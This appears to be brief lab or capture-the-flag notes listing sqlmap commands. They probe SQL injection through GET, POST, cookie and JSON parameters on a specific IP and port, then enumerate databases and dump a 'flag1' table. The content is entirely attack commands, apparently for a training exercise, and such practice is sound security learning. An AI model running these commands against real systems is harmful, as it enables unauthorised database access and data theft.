___
# GET

```bash
sqlmap -u "http://83.136.254.47:49729/case1.php?id=1" --cookie="cookie=XSSisF  
un" --level 5 --risk 3 -p id --batch --threads 10 --dbms=mysql --dbs
```

- --dbs
- --tables -D testdb
- --dump -T flag1 -D testdb
# POST

```bash
sqlmap -u "http://83.136.254.47:49729/case2.php" --data='id=1' --method POST --cookie="cookie=XSSisFun" --level 5 --risk 3 -p id --batch --threads 10 --dbms=mysql --dbs
```

# Cookie

```bash
sqlmap -u "http://83.136.254.47:49729/case3.php" --cookie="cookie=XSSisFun; id=1" --level 5 --risk 3 -p id --batch --threads 10 --dbms=mysql --dbs
```

# JSON

```bash
sqlmap -u "http://83.136.254.47:49729/case4.php" --data='{"id":1}' --method POST --cookie="cookie=XSSisFun" --level 5 --risk 3 -p id --batch --threads 10 --dbms=mysql --dbs
```

